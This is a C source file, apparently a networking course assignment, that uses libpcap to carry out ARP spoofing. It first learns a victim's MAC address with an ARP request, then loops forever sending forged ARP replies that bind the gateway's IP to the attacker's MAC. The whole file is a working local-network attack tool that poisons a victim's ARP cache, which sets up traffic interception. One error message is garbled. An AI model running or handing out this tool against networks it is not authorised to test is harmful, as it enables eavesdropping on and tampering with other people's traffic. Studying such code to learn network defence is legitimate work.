#include <main.h>
#include <util.h>

// Print Usage
void usage() {
    printf("syntax: pcap_test <interface> <sender ip> <target ip>\n");
    printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

void receiveArpPacket(IN pcap_t *handle, IN uint8_t *macAddress, OUT arpStructure *receivedArpPacket) {
    arpStructure *arpPacket = NULL;

    // packet parsing
    while(!arpPacket) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        // end skeleton code

        // parse Ethernet in Datalink Layer
        ethernetHeader *ethernetPacket = (ethernetHeader *)packet;

        switch(ntohs(ethernetPacket->type)) {
            case ETHERNET_TYPE_ARP: // value is 0x0806
                if(!memcmp(ethernetPacket->destinationMac, macAddress, ARP_HARDWARE_LENGTH_ETHERNET)) { 
                    arpPacket = (arpStructure *)(packet + sizeof(ethernetHeader));

                    // Print Ethernet Packet
                    printf("[*] Ethernet Information\n");
                    printMacAddress("  - Dest MAC : ", ethernetPacket->destinationMac);
                    printMacAddress("  - Src  MAC : ", ethernetPacket->sourceMac);
                    printf("  - Type     : [%04x]",  ntohs(ethernetPacket->type));

                    printf("\n");

                    // Print ARP Packet
                    printf("[*] ARP Information\n");
                    printArpPacketInfo(*arpPacket);
                    memcpy(receivedArpPacket, arpPacket, sizeof(arpStructure));
                }
                break;
            default:
                break;
        }
        printf("\n");
    }
}

int getVictimMacAddress(IN pcap_t *handle, IN char *interfaceName, IN char *victimIpAddress, OUT uint8_t *victimMacAddress) {
    int ret = EXIT_FAILURE;
    struct in_addr laddr;
    uint8_t buf[sizeof(ethernetHeader) + sizeof(arpStructure)];
    arpStructure receivedArpPacket;

    // Initialize Ethernet Packet
    ethernetHeader ethernetPacket;

    // set source MAC Address for Ethernet
    if(getMacAddress(interfaceName, ethernetPacket.sourceMac) == EXIT_FAILURE) {
        fprintf(stderr, "Invalid Attacker MAC Address!\n");
        goto end;
    }

    // set destination MAC Address for Ethernet
    memset(ethernetPacket.destinationMac, 0xFF, ARP_HARDWARE_LENGTH_ETHERNET);

    // set Ethernet Type
    ethernetPacket.type = htons(ETHERNET_TYPE_ARP);

    // Initialize ARP Packet
    arpStructure arpPacket;
    arpPacket.hardwareType   = htons(ARP_HARDWARE_TYPE_ETHERNET);
    arpPacket.protocolType   = htons(ARP_PROTOCOL_TYPE_IP);
    arpPacket.hardwareLength = ARP_HARDWARE_LENGTH_ETHERNET;
    arpPacket.protocolLength = ARP_PROTOCOL_LENGTH_IP;
    arpPacket.operationCode  = htons(ARP_OPERATION_REQUEST);

    // set source MAC Address for ARP
    if(getMacAddress(interfaceName, arpPacket.sourceHardwareAddress) == EXIT_FAILURE) {
        fprintf(stderr, "Invalid Attacker MAC Address!\n");
        goto end;
    }

    // set destination MAC Address
    memset(arpPacket.destinationHardwareAddress, 0x00, ARP_HARDWARE_LENGTH_ETHERNET);

    // set source IP Address 
    if(getIpAddress(interfaceName, arpPacket.sourceProtocolAddress) < 0) {
        fprintf(stderr, "Get IP Address Failed!\n");
        goto end;
    }

    // set destination IP Address 
    if(inet_aton(victimIpAddress, &laddr) < 0) {
        fprintf(stderr, "IP Address Format Invalid!\n");
        goto end;
    }
    memcpy(&arpPacket.destinationProtocolAddress, &laddr.s_addr, ARP_PROTOCOL_LENGTH_IP);

    // assemble Packet
    memcpy(buf, &ethernetPacket, sizeof(ethernetHeader));
    memcpy(buf + sizeof(ethernetHeader), &arpPacket, sizeof(arpStructure));

    printf("[+] Initialize\n");
    printArpPacketInfo(arpPacket);
    printf("\n");

    printf("[*] Send ARP Packet\n");
    if(pcap_sendpacket(handle, buf, sizeof(buf))) {
        fprintf(stderr, "Send ARP Packet Error!\n");
        goto end;   
    }
    printf("\n");

    printf("[+] Get MAC Address\n");
    receiveArpPacket(handle, ethernetPacket.sourceMac, &receivedArpPacket);
    if(!receivedArpPacket.sourceHardwareAddress) {
        fprintf(stderr, "Receive ARP Packet Error!\n");
        goto end;
    }
    memcpy(victimMacAddress, receivedArpPacket.sourceHardwareAddress, ARP_HARDWARE_LENGTH_ETHERNET);
    
    ret = EXIT_SUCCESS;

end:
    return ret;
}

int spoofMacAddress(IN pcap_t *handle, IN char *interfaceName, IN char *victimIpAddress, IN char *gatewayIpAddress, IN uint8_t *victimMacAddress) {
    int ret = EXIT_FAILURE;
    struct in_addr laddr;
    uint8_t buf[sizeof(ethernetHeader) + sizeof(arpStructure)];
    arpStructure receivedArpPacket;

    // Initialize Ethernet Packet
    ethernetHeader ethernetPacket;

    // set source MAC Address for Ethernet
    if(getMacAddress(interfaceName, ethernetPacket.sourceMac) == EXIT_FAILURE) {
        fprintf(stderr, "Invalid Attacker MAC Address!\n");
        goto end;
    }

    // set destination MAC Address for Ethernet
    memcpy(ethernetPacket.destinationMac, victimMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);

    // set Ethernet Type
    ethernetPacket.type = htons(ETHERNET_TYPE_ARP);

    // Initialize ARP Packet
    arpStructure arpPacket;
    arpPacket.hardwareType   = htons(ARP_HARDWARE_TYPE_ETHERNET);
    arpPacket.protocolType   = htons(ARP_PROTOCOL_TYPE_IP);
    arpPacket.hardwareLength = ARP_HARDWARE_LENGTH_ETHERNET;
    arpPacket.protocolLength = ARP_PROTOCOL_LENGTH_IP;
    arpPacket.operationCode  = htons(ARP_OPERATION_REPLY);

    // set source MAC Address for ARP
    if(getMacAddress(interfaceName, arpPacket.sourceHardwareAddress) == EXIT_FAILURE) {
        fprintf(stderr, "Invalid Attacker MAC Address!\n");
        goto end;
    }

    // set destination MAC Address
    memcpy(arpPacket.destinationHardwareAddress, victimMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);

    // set source IP Address 
    if(inet_aton(gatewayIpAddress, &laddr) < 0) {
        fprintf(stderr, "IP Address Format Invalid!\n");
        goto end;
    }
    memcpy(&arpPacket.sourceProtocolAddress, &laddr.s_addr, ARP_PROTOCOL_LENGTH_IP);

    // set destination IP Address 
    if(inet_aton(victimIpAddress, &laddr) < 0) {
        fprintf(stderr, "IP Address Format Invalid!\n");
        goto end;
    }
    memcpy(&arpPacket.destinationProtocolAddress, &laddr.s_addr, ARP_PROTOCOL_LENGTH_IP);

    // Assemble Packet
    memcpy(buf, &ethernetPacket, sizeof(ethernetHeader));
    memcpy(buf + sizeof(ethernetHeader), &arpPacket, sizeof(arpStructure));

    printf("[+] Initialize\n");
    printArpPacketInfo(arpPacket);
    printf("\n");

    while(1) {
        printf("[*] Send ARP Packet...\n");
        if(pcap_sendpacket(handle, buf, sizeof(buf))) {
            fprintf(stderr, "Send ARP Packet Error!\n");
            goto end;   
        }
        printf("\n");
        sleep(1);
    }

    ret = EXIT_SUCCESS;

end:
    return ret;
}

// Main Function
int main(int argc, char* argv[]) {
    int ret = EXIT_FAILURE;
    pcap_t *handle = NULL;
    char errbuf[PCAP_ERRBUF_SIZE];
    uint8_t macAddress[ARP_HARDWARE_LENGTH_ETHERNET];

    // require arguments
    if (argc != 4) {
        usage();
        goto end;
    }

    // get packet using pcap library
    if(!(handle = pcap_open_live(argv[1], BUFSIZ, 1, 1024, errbuf))) {
        fprintf(stderr, "couldn't open devicnetinet/if_ether.he %s: %s\n", argv[1], errbuf);
        goto end;
    }

    // Get Victim MAC Address
    printf("[*] 1. Get Victim MAC Address\n");
    getVictimMacAddress(handle, argv[1], argv[2], macAddress);
    printMacAddress("[*] Victim MAC Address : ", macAddress);
    printf("\n\n");

    // Spoofing MAC Address
    printf("[*] 2. ARP Spoofing\n");
    spoofMacAddress(handle, argv[1], argv[2], argv[3], macAddress);
    
    ret = EXIT_SUCCESS; 

end:
    if(handle) {
        pcap_close(handle);
    }
    return ret;
}
